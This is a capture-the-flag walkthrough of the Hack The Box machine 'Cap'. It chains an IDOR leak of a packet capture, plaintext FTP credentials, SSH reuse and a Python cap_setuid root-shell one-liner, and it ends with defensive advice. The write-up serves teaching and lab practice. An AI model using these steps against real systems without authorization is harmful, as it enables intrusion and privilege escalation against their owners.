# Hack The Box - Cap

## Overview

**Cap** is a Linux machine that demonstrates how a relatively small web application vulnerability can expose credentials and eventually lead to full system compromise.

The main attack path is:

`Web enumeration -> IDOR -> PCAP disclosure -> FTP credentials -> SSH -> Linux capabilities -> root`

The most useful lesson from this machine was that the web vulnerability itself did not directly provide code execution. Instead, it exposed network traffic containing credentials, which could then be reused against other services.

---

## Initial Enumeration

I started by scanning the target with Nmap.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The important services were:

```text
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
```

The FTP service did not immediately provide anonymous access, so I moved on to the web application.

---

## Web Enumeration

Browsing to:

```text
http://<TARGET_IP>
```

revealed a network monitoring dashboard.

The application exposed several pieces of system information and contained functionality for viewing network statistics and security snapshots.

While exploring the application, I found the security snapshot functionality.

The URL followed a structure similar to:

```text
/data/1
```

The number represented the ID of a captured network snapshot.

This immediately suggested testing whether the application properly checked whether the current user was authorized to access other snapshot IDs.

---

## IDOR

Changing the ID manually allowed access to snapshots that were not normally presented through the interface.

For example:

```text
/data/1
/data/0
```

Accessing:

```text
/data/0
```

revealed another network capture.

This was an **Insecure Direct Object Reference**, or IDOR.

The application accepted an object identifier directly from the URL but did not properly verify that the requesting user should have access to that object.

The snapshot could be downloaded as a PCAP file.

---

## PCAP Analysis

I downloaded the capture and opened it in Wireshark.

Because FTP was exposed on the machine, FTP traffic was particularly interesting.

FTP is important from a security perspective because traditional FTP does not encrypt authentication traffic.

I filtered for FTP traffic:

```text
ftp
```

Inside the capture, the FTP authentication exchange exposed a username and password in plaintext.

The traffic contained commands similar to:

```text
USER nathan
PASS <REDACTED>
```

This gave us credentials for:

```text
nathan
```

---

## Credential Reuse

I first verified the credentials against the FTP service.

```bash
ftp <TARGET_IP>
```

After authenticating as `nathan`, the credentials provided access to the FTP server.

However, port 22 was also exposed.

Since credential reuse is common, I tested the same credentials over SSH.

```bash
ssh nathan@<TARGET_IP>
```

The credentials worked.

I now had an interactive shell as:

```text
nathan
```

The user flag could be retrieved from the user's home directory.

```bash
cat ~/user.txt
```

---

# Privilege Escalation

## Initial Enumeration

After gaining SSH access, I started enumerating the system for privilege escalation opportunities.

Some useful checks include:

```bash
id
sudo -l
uname -a
cat /etc/os-release
```

Another important Linux privilege escalation check is searching for binaries with additional Linux capabilities.

```bash
getcap -r / 2>/dev/null
```

This revealed something particularly interesting involving Python.

The Python binary had:

```text
cap_setuid+ep
```

---

## Linux Capabilities

Linux capabilities divide traditional root privileges into smaller individual permissions.

Instead of giving a process every privilege available to root, a binary can be granted a specific capability.

In this case:

```text
cap_setuid
```

allows the process to manipulate its user ID.

That becomes dangerous when the capability is assigned to an interpreter such as Python.

Python can directly call operating system functions, including:

```python
os.setuid()
```

Normally an unprivileged user cannot simply change their UID to `0`.

But because the Python binary had `cap_setuid`, Python was allowed to perform that operation.

---

## Exploiting cap_setuid

I used Python to change the process UID to `0` and launch a shell.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

I then checked the current identity:

```bash
id
```

The shell was now running as:

```text
uid=0(root)
```

Root access had been achieved.

The root flag could then be retrieved:

```bash
cat /root/root.txt
```

Cap was complete.

---

# Attack Path

```text
Nmap
  |
  +--> FTP
  +--> SSH
  +--> HTTP
         |
         v
Network monitoring dashboard
         |
         v
Security snapshots
         |
         v
/data/<ID>
         |
         v
IDOR
         |
         v
/data/0
         |
         v
PCAP disclosure
         |
         v
FTP traffic
         |
         v
Plaintext credentials
         |
         v
nathan
         |
         v
SSH
         |
         v
User shell
         |
         v
getcap -r /
         |
         v
Python cap_setuid
         |
         v
os.setuid(0)
         |
         v
root
```

---

# Key Lessons

## IDOR Can Expose Much More Than a Single Record

The initial vulnerability was an authorization problem.

The application allowed the client to specify the object ID:

```text
/data/0
```

without properly checking whether that object should be accessible.

In this case the exposed object was particularly sensitive because it contained captured network traffic.

A seemingly simple IDOR therefore became the starting point for complete system compromise.

---

## PCAP Files Can Contain Credentials

Packet captures can contain extremely sensitive information.

Protocols that transmit authentication data without encryption may expose credentials directly.

Examples include:

```text
FTP
HTTP
Telnet
POP3
IMAP
```

when they are used without an encrypted transport.

Wireshark can make this traffic easy to inspect.

For FTP:

```text
ftp
```

is a useful display filter.

---

## Credential Reuse Expands the Impact

The credentials discovered in FTP traffic were not useful only for FTP.

The same credentials authenticated over SSH.

This transformed information disclosure into interactive system access.

When credentials are discovered during an authorized assessment, it is worth determining which exposed services accept the same authentication source.

---

## Linux Capabilities Matter

Privilege escalation enumeration should not stop at:

```bash
sudo -l
```

Linux capabilities can grant powerful privileges to binaries without making those binaries SUID.

A useful enumeration command is:

```bash
getcap -r / 2>/dev/null
```

Capabilities worth investigating include:

```text
cap_setuid
cap_setgid
cap_dac_override
cap_sys_admin
cap_sys_ptrace
```

The actual risk depends on the binary receiving the capability.

---

## Interpreters With Capabilities Are Particularly Dangerous

Giving:

```text
cap_setuid
```

to a narrowly designed program may have a legitimate purpose.

Giving the same capability to a general-purpose interpreter such as Python is far more dangerous.

Python allows arbitrary code execution.

Therefore:

```text
Python + cap_setuid
```

effectively allows a user who can execute that interpreter to create a process running as UID `0`.

That is why the privilege escalation was so simple:

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

---

# Defensive Notes

The IDOR could have been prevented by performing server-side authorization checks for every requested capture instead of trusting the numeric object ID supplied by the client.

Sensitive network captures should also be tightly access controlled. Packet captures can contain credentials, session information, internal addresses, and application data.

FTP should be replaced with an encrypted protocol where possible. Traditional FTP transmits authentication information without encryption, which is why the credentials could be recovered from the PCAP.

Password reuse between services should also be avoided.

Finally, Linux capabilities should follow the principle of least privilege. General-purpose interpreters such as Python should not receive powerful capabilities such as:

```text
cap_setuid
```

unless there is an exceptional and carefully controlled reason.

Defenders can audit capabilities using:

```bash
getcap -r / 2>/dev/null
```

Unexpected capability assignments should be investigated.

---

# Skills Practiced

- Nmap enumeration
- Web application enumeration
- IDOR identification
- PCAP analysis
- Wireshark
- FTP analysis
- Plaintext credential discovery
- Credential reuse
- SSH
- Linux privilege escalation
- Linux capabilities
- `cap_setuid`
- Python privilege escalation

---

## Disclaimer

This writeup documents techniques used in an authorized Hack The Box lab environment for educational purposes.
